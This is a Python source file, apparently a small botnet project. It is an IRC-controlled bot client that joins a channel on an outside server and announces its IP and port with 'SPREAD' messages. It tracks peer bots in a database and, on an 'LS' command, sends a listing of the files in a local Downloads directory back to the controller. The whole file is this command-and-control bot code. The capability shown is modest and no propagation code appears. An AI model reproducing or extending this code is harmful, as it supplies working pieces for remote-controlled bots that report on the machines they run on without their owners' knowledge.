import asyncio
from time import sleep
from irc import irc_service
from log import logger
from context import context
from botnet import botnet_database
import socket
import os

syslog = logger.Logger()
myContext = None
botnetDB = botnet_database.BotnetDatabase()
storageDirectory = "/home/slaugh/Downloads"

ircNick = "woodworm1"


async def irc_onConnected(*args, **kwargs):
    irc_connection = args[0]
    await irc_connection.join_channel()


async def irc_onBroadcastRequested(*args, **kwargs):
    irc_connection = args[0]
    syslog.log("Broadcast requested", level=logger.LogLevel.DEBUG)
    syslog.log("SPREADING...", level=logger.LogLevel.DEBUG)
    await irc_connection.send_message(f"SPREAD ip:{myContext.get_ip()} port:{myContext.get_port()}")


async def irc_onSpreadDetected(*args, **kwargs):
    irc_connection = args[0]
    ip = kwargs.get('ip')
    port = kwargs.get('port')
    nick = kwargs.get('ircNick')
    syslog.log(f"SPREAD DETECTED: nick:{nick}, ip:{ip} port:{port}", level=logger.LogLevel.DEBUG)

    if botnetDB.get_bot(nick) is None:
        botnetDB.add_bot(context.Context(nick, ip, port))
        syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
        syslog.log(f"Number of bots: {len(botnetDB.get_bots())}", level=logger.LogLevel.INFO)


async def irc_onSomeoneLeftChannel(*args, **kwargs):
    nick = kwargs.get('ircNick')
    if botnetDB.get_bot(nick) is not None:
        botnetDB.remove_bot(botnetDB.get_bot(nick))
        syslog.log(f"Bot removed from DB: nick: {nick}", level=logger.LogLevel.INFO)
        syslog.log(f"Number of bots: {len(botnetDB.get_bots())}", level=logger.LogLevel.INFO)


async def irc_onCommandLS(*args, **kwargs):
    irc_connection = args[0]
    nickname = kwargs.get('nickname')
    files = await list_files()
    await irc_connection.send_query(nickname, f"FILES {files}")


async def list_files():
    files = []
    try:
        files = await asyncio.to_thread(os.listdir, storageDirectory)
    except Exception as e:
        syslog.log(f"Error listing files: {str(e)}", level=logger.LogLevel.ERROR)
    return files


async def another_loop():
    while True:
        await asyncio.sleep(1)
        syslog.log("I'm still alive!", level=logger.LogLevel.DEBUG) 


async def main():
    irc_connection = irc_service.IRCConnection('slaugh.pl', 'slaugh.pl', 2000, ircNick, '#vorest')
    irc_connection.onConnected.subscribe(irc_onConnected)
    irc_connection.onBroadcastRequested.subscribe(irc_onBroadcastRequested)
    irc_connection.onSpreadDetected.subscribe(irc_onSpreadDetected)
    irc_connection.onSomeoneLeftChannel.subscribe(irc_onSomeoneLeftChannel)
    irc_connection.onCommandLS.subscribe(irc_onCommandLS)

    await irc_connection.connect()
    await irc_connection.register_user()
    
    async with asyncio.TaskGroup() as tg:
        tg.create_task(irc_connection.listen())
        tg.create_task(another_loop())

    # await irc_connection.listen()


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    myContext = context.Context(ircNick, my_ip, 3000)
    myContext.set_connected(True)
    asyncio.run(main())
